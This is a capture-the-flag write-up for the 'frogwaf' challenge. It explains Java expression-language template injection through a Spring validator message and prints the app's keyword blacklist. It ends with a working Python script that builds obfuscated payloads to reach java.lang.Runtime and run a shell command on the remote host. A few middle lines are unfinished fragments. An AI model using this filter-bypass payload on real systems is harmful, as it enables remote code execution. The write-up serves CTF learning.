This challenge is SSTI with Java expression language, the main difficulty is the filter bypass.

# Overview

The app is just a simple form where you submit name, contact number, country etc and validation is performed on the input.

# Foothold

After reading through the code, I notice the following in countryvalidator.java

```java:CountryValidator.java
            val message = String.format("%s is not a valid country", input);
            constraintContext.disableDefaultConstraintViolation();
            constraintContext.buildConstraintViolationWithTemplate(message)
                    .addConstraintViolation();
```

The method name `buildConstraintViolationWithTemplate` led me to believe that there might be some form of SSTI, and after a quick Google search I learned that that method will evaluate java expression language.

To test this, I submitted the form with `${7*7}` as the country. However, this is where I encountered the filter.

<Image>

Back to the code, here is the filter. Basically the app checks whether the request body contains any of the blacklisted strings, and if so returns an `AccessDeniedException`

```java:AttackTypes.java
public enum AttackTypes {
    SQLI("\"", "'", "#"),
    XSS(">", "<"),
    OS_INJECTION("bash", "&", "|", ";", "`", "~", "*"),
    CODE_INJECTION("for", "while", "goto", "if"),
    JAVA_INJECTION("Runtime", "class", "java", "char", "Process", "cmd", "eval", "Char", "true", "false"), // Name
    IDK("+", "-", "/", "*", "%", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");

    @Getter
    private final String[] attackStrings;

    AttackTypes(String... attackStrings) {
        this.attackStrings = attackStrings;
    }

}
```

I ran the project locally (the authors were kind enough to provide the full docker configuration so I only had to run `docker build -t frogwaf` and `docker run -t frogwaf`), I removed the `IDK` attack type, and resubmitted the payload `${7*7}`. Here is the result:

<Image>

Now, I was confident that the challenge is SSTI bypass.

# Exploit

I looked up java SSTI in HackTricks. From this article <link>, I learned that I needed to run `T(java.lang.Runtime).<etc>`. Looking at the frogwaf filter, I needed a few things first.

1. a class
2. arbitrary number
3. arbitrary string

## Getting a class

We begin by getting access to a class. After testing various payloads, I found that `${[].getClass()}` successfully returned `<class java.lang.ArrayList>`. Furthermore, `${[].toString()}` gives us access to a string. I looked up the list of string methods

getMethods()
forName()

IOUtils.

Found Spring

Overall, this challenge, though very tedious, was mostly straightforward. The main difficulty came from the bugs I encountered along the way

Here is the (pretty scuffed) solve script:

```python:s.py
import requests
from string import ascii_lowercase

integer = '[].toString().length()'
one = '[].toString().length().bitCount([].toString().length())'
two = '[].toString().length()'
zero = f'{integer}.remainderUnsigned({two}, {two})'
# _36 = f'{integer}.sum([].getClass().toString().length(), [].getClass().toString().length())'

def get_large_number(n):
    if n == 0: return zero
    if n == 1: return one
    if n == 2: return two
    prev = two
    for _ in range(n//2 - 1):
        prev = f'[].toString().length().sum({prev}, {two})'
    if n % 2 == 1:
        prev = f'[].toString().length().sum({prev}, {one})'
    return prev

def get_lower_alpha(a):
    i = ascii_lowercase.index(a)
    return f'{integer}.toString({get_large_number(i + 10)}, {get_large_number(36)})'


def get_upper_alpha(a):
    return get_lower_alpha(a) + '.toUpperCase()'


def get_string(s):
    parts = []
    for c in s:
        if c == ' ':
            parts.append(f'[].getClass().toString().substring({get_large_number(5)}).substring({zero}, {one})')
        elif c == '.':
            parts.append(f'[].getClass().toString().substring({get_large_number(10)}).substring({zero}, {one})')
        elif c.isalpha() and c.islower():
            parts.append(get_lower_alpha(c))
        elif c.isalpha():
            parts.append(get_upper_alpha(c.lower()))
        else:
            Character = f'[].toString().getClass().getMethods()[{get_large_number(22)}].invoke([].toString(), {zero}).getClass()'  # charAt(int)
            parts.append(f'[].toString().valueOf({Character}.getMethods()[{get_large_number(39)}].invoke(null, {get_large_number(ord(c))}))')  # toChars(int)
    return parts[0] + '.concat(' + ').concat('.join(parts[1:]) + ')'


Runtime = f'[].getClass().getClass().getMethods()[{two}].invoke(null, {get_string("java.lang.Runtime")})'
StreamUtils = f'[].getClass().getClass().getMethods()[{two}].invoke(null, {get_string("org.springframework.util.StreamUtils")})'
Charset = f'[].getClass().getClass().getMethods()[{two}].invoke(null, {get_string("java.nio.charset.Charset")})'
code = f'{StreamUtils}.getMethods()[{get_large_number(3)}].invoke(null, {Runtime}.getMethods()[{get_large_number(6)}].invoke(null).exec({get_string("cat flag-7662fe897b3335f35ff4c3c81b9e6371.txt")}).getInputStream(), {Charset}.getMethods()[{get_large_number(13)}].invoke(null))'

print(len(code))
pay = '${' + code + '}'

resp = requests.post('http://frog-waf.chals.sekai.team/addContact', json={"firstName": "First", "lastName": "Last", "description": "Helloall", "country": pay})
# print(resp.json()['violations'][0]['message'])
print(resp.text)
```